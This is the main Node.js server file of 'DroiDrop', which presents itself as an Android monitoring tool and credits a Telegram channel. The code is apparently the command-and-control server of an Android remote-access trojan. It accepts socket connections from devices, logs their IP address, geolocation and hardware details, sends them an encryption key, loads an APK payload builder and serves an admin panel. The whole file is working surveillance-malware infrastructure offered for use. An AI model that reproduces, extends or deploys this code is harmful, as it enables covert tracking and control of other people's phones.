/* 
*   DroiDrop
*   An Android Monitoring Tools
*   By t.me/efxtv
*/


const
    express = require('express'),
    app = express();
const
    http = require('http');
const server = http.createServer(app);

const CryptoManager = require('./includes/cryptoManager');

const IO = require('socket.io')(server, { maxHttpBufferSize: 1e8, pingTimeout: 60000, });
const geoip = require('geoip-lite'),
    CONST = require('./includes/const'),
    db = require('./includes/databaseGateway'),
    logManager = require('./includes/logManager'),
    clientManager = new (require('./includes/clientManager'))(db, CryptoManager.getInstance()),
    apkBuilder = require('./includes/apkBuilder');

global.CONST = CONST;
global.db = db;
global.logManager = logManager;
global.app = app;
global.clientManager = clientManager;
global.apkBuilder = apkBuilder;

// spin up socket server
let client_io = IO.listen(CONST.control_port);

client_io.sockets.pingInterval = 60000;
client_io.on('connection', (socket) => {
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;
    
    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}
    
    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });
    
    if(!clientManager.getClientSettings(clientParams.id).isPkSent){
        console.log("welcome - >", CryptoManager.getInstance().publicKeyPem);
        socket.emit('welcome', CryptoManager.getInstance().publicKeyPem);
    }

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);    // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);      // additional call to catch-all
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }

});


// get the admin interface online
server.listen(CONST.web_port, "0.0.0.0", () =>{
    console.log("server is up at port ", CONST.web_port);
});

/* 
*   
*   
*   t.me/efxtv
*/
app.set('view engine', 'ejs');
app.set('views', './assets/views');
app.use(express.static(__dirname + '/assets/webpublic'));
app.use(require('./includes/expressRoutes'));
